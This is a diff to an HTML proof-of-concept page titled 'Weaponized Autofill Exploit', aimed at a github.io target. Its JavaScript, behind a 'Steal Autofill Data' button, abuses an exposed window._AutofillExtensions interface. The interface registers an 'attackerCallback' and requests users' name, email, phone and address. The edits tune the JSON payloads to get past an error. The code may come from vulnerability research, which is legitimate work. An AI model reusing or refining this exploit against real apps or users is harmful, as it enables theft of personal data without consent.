@@ -10,7 +10,7 @@
     </style>
 </head>
 <body>
-    <h2>Weaponized Autofill Exploit</h2>
+    <h2>Weaponized2 Autofill Exploit</h2>
     <p>Target: linux-1723.github.io</p>
     
     <button onclick="attackAutofill()">1. Steal Autofill Data</button>
@@ -41,7 +41,7 @@
                 // Added "callbackID" as requested by the Java exception
                 let initPayload = JSON.stringify({
                     "callbackID": "attackerCallback",
-                    "callbackName": "attackerCallback"
+                    "name": "attackerCallback"
                 });
                 
                 window._AutofillExtensions.initializeCallbackHandler(initPayload);
@@ -52,6 +52,7 @@
                 // Added "callbackID" here as well, along with requested fields
                 let requestPayload = JSON.stringify({
                     "callbackID": "attackerCallback",
+                    "name": "attackerCallback",
                     "request_id": "1337",
                     "requested_fields": ["NAME", "EMAIL", "PHONE", "ADDRESS"]
                 });
